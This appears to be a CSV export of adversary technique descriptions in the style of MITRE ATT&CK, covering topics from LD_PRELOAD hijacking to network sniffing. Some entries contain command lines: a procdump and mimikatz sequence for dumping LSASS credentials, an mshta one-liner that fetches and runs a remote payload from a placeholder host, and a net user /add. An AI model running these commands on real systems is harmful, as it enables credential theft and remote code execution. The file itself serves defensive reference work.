LC_MAIN Hijacking,"**This technique has been deprecated and should no longer be used.**As of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binarys entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD  . The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesnt know anything was different  . By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.",technique
LD_PRELOAD,"Adversaries may execute their own malicious payloads by hijacking the dynamic linker used to load libraries. The dynamic linker is used to load shared library dependencies needed by an executing program. The dynamic linker will typically check provided absolute paths and common directories for these dependencies, but can be overridden by shared objects specified by LD_PRELOAD to be loaded before all others.Adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. LD_PRELOAD can be set via the environment variable or /etc/ld.so.preload file. Libraries specified by LD_PRELOAD with be loaded and mapped into memory by dlopen() and mmap() respectively.  LD_PRELOAD hijacking may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. Execution via LD_PRELOAD hijacking may also evade detection from security products since the execution is masked under a legitimate process.",technique
LLMNR/NBT-NS Poisoning and SMB Relay,"By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.  Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through  and crack the hashes offline through  to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and .   ",technique
LSA Secrets,"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets. LSA secrets can also be dumped from memory. can be used to extract from the Registry.  can be used to extract secrets from memory.",technique
LSASS Driver,"Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., ), an adversary can use LSA operations to continuously execute malicious payloads.",technique
LSASS Memory,"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct  using .As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.For example, on the target host use procdump:* procdump -ma lsass.exe lsass_dumpLocally, mimikatz can be run using:* sekurlsa::Minidump lsassdump.dmp* sekurlsa::logonPasswordsWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages and HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.The following SSPs can be used to access credentials:* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.",technique
Lateral Tool Transfer,"Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with  or . Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",technique
Launch Agent,"Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. Per Apples developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in /System/Library/LaunchAgents, /Library/LaunchAgents, and $HOME/Library/LaunchAgents   . These launch agents have property list files which point to the executables that will be launched . Adversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories    . The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in  . They can be set up to execute when a specific user logs in (in the specific users directory structure) or when any user logs in (which requires administrator privileges).",technique
Launch Daemon,"Adversaries may create or modify launch daemons to repeatedly execute malicious payloads as part of persistence. Per Apples developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in /System/Library/LaunchDaemons and /Library/LaunchDaemons . These LaunchDaemons have property list files which point to the executables that will be launched . Adversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories  . The daemon name may be disguised by using a name from a related operating system or benign software . Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root. The plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemons executable and gain persistence or Privilege Escalation. ",technique
Launchctl,"Adversaries may abuse launchctl to execute commands or programs. Launchctl controls the macOS launchd process, which handles things like s and s, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.By loading or reloading s or s, adversaries can install persistence or execute changes they made.Running a command from launchctl is as simple as launchctl submit -l <labelName> -- /Path/to/thing/to/execute ""arg"" ""arg"" ""arg"". Adversaries can abuse this functionality to execute code or even bypass application control if launchctl is an allowed process.",technique
Launchd,"Adversaries may abuse the Launchd daemon to perform task scheduling for initial or recurring execution of malicious code. The launchd daemon, native to macOS, is responsible for loading and maintaining services within the operating system. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in /System/Library/LaunchDaemons and /Library/LaunchDaemons . These LaunchDaemons have property list files which point to the executables that will be launched .An adversary may use the launchd daemon in macOS environments to schedule new executables to run at system startup or on a scheduled basis for persistence. launchd can also be abused to run a process under the context of a specified account. Daemons, such as launchd, run with the permissions of the root user account, and will operate regardless of which user account is logged in.",technique
Linux and Mac File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platforms permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: chown (short for change owner), and chmod (short for change mode).Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via  or tainting/hijacking other instrumental binary/configuration files via .",technique
Local Account,"Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the net user /add command can be used to create a local account.Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",technique
Local Account,"Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.Commands such as net user and net localgroup of the  utility and id and groupson macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the /etc/passwd file.",technique
Local Accounts,"Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.Local Accounts may also be abused to elevate privileges and harvest credentials through . Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ",technique
Local Data Staging,"Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as . Interactive command shells may be used, and common functionality within  and bash may be used to copy data into a staging location.",technique
Local Email Collection,"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a users local system, such as Outlook storage or cache files.Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB. IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\Users\<username>\Documents\Outlook Files` or `C:\Users\<username>\AppData\Local\Microsoft\Outlook`.",technique
Local Groups,"Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.Commands such as net localgroup of the  utility, dscl . -list /Groups on macOS, and groups on Linux can list local groups.",technique
Logon Script (Mac),"Adversaries may use macOS logon scripts automatically executed at logon initialization to establish persistence. macOS allows logon scripts (known as login hooks) to be executed whenever a specific user logs into a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike , a login hook executes as the elevated root user.Adversaries may use these login hooks to maintain persistence on a single system. Access to login hook scripts may allow an adversary to insert additional malicious code. There can only be one login hook at a time though and depending on the access configuration of the hooks, either local credentials or an administrator account may be necessary. ",technique
Logon Script (Windows),"Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system. This is done via adding a path to a script to the HKCU\Environment\UserInitMprLogonScript Registry key.Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. ",technique
MSBuild,"Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into an XML project file. MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.",technique
Mail Protocols,"Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",technique
Make and Impersonate Token,"Adversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the LogonUser function. The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.",technique
Malicious File,"An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from . Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.Adversaries may employ various forms of  on the file to increase the likelihood that a user will open it.While  frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after .",technique
Malicious Link,An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from . Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via . Links may also lead users to download files that require execution via .,technique
Malware,"Before compromising a victim, adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors, packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of .",technique
Malware,"Before compromising a victim, adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",technique
Man in the Browser,"Adversaries can take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify behavior, and intercept information as part of various man in the browser techniques. A specific example is when an adversary injects software into a browser that allows an them to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the browser as a way to pivot into an authenticated intranet.  Browser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. Browser traffic is pivoted from the adversary's browser through the user's browser by setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter the user's traffic in any way. The proxy connection is severed as soon as the browser is closed. Whichever browser process the proxy is injected into, the adversary assumes the security context of that process. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could browse to any resource on an intranet that is accessible through the browser and which the browser has sufficient permissions, such as Sharepoint or webmail. Browser pivoting also eliminates the security provided by 2-factor authentication. ",technique
Man-in-the-Middle,"Adversaries may attempt to position themselves between two or more networked devices using a man-in-the-middle (MiTM) technique to support follow-on behaviors such as  or . By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.Adversaries may leverage the MiTM position to attempt to modify traffic, such as in . Adversaries can also stop traffic from flowing to the appropriate destination, causing denial of service.",technique
Masquerade Task or Service,"Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",technique
Masquerading,"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.Renaming abusable system utilities to evade security monitoring is also a form of .",technique
Match Legitimate Name or Location,"Adversaries may match or approximate the name or location of legitimate files when naming/placing their files. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). Alternatively, the filename given may be a close approximation of legitimate programs or something innocuous.Adversaries may also use the same icon of the file they are trying to mimic.",technique
Modify Authentication Process,"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows or pluggable authentication modules (PAM) on Unix-based systems, responsible for gathering, storing, and validating credentials. Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. ",technique
Modify Cloud Compute Infrastructure,"An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.",technique
Modify Registry,"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility  may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via  or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often  are required, along with access to the remote system's  for RPC communication.",technique
Modify System Image,"Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",technique
Mshta,"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]htaMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. ",technique
Msiexec,"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). Msiexec.exe is digitally signed by Microsoft.Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse.",technique
Multi-Stage Channels,"Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or  in case the original first-stage communication path is discovered and blocked.",technique
Multi-hop Proxy,"To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. In the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging , adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the  method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organizations WAN. Protocols such as ICMP may be used as a transport.",technique
Multiband Communication,"**This technique has been deprecated and should no longer be used.**Some adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.",technique
NTDS,"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in %SystemRoot%\NTDS\Ntds.dit of a domain controller.In addition to looking NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.* Volume Shadow Copy* secretsdump.py* Using the in-built Windows tool, ntdsutil.exe* Invoke-NinjaCopy",technique
NTFS File Attributes,"Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files).    Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.  ",technique
Native API,"Adversaries may directly interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.Functionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API CreateProcess() or GNU fork() will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.Adversaries may abuse these native API functions as a means of executing behaviors. Similar to , the native API and its hierarchy of interfaces, provide mechanisms to interact with and utilize various components of a victimized system.",technique
Netsh Helper DLL,"Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.  The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\SOFTWARE\Microsoft\Netsh.Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality. ",technique
Network Address Translation Traversal,"Adversaries may bridge network boundaries by modifying a network devices Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  Adversaries may use  to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",technique
Network Boundary Bridging,"Adversaries may bridge network boundaries by compromising perimeter network devices. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via  or exfiltration of data via .  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",technique
Network Denial of Service,"Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.For DoS attacks targeting the hosting system directly, see .",technique
Network Device Authentication,"Adversaries may use  to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices. may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.",technique
Network Device CLI,"Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. Scripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or secure shell (SSH).Adversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection. ",technique
Network Device Configuration Dump,"Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.Adversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.   These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ",technique
Network Logon Script,"Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects. These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.   Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",technique
Network Security Appliances,"Before compromising a victim, adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.Adversaries may gather this information in various ways, such as direct collection actions via  or . Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex: ).",technique
Network Service Scanning,"Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.",technique
Network Share Connection Removal,Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and  connections can be removed when no longer needed.  is an example utility that can be used to remove network share connections with the net use \\system\share /delete command. ,technique
Network Share Discovery,Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. File sharing over a Windows network occurs over the SMB protocol.    can be used to query a remote system for available shared drives using the net view \\remotesystem command. It can also be used to query shared drives on the local system using net share.,technique
Network Sniffing,"Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as , can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.",technique
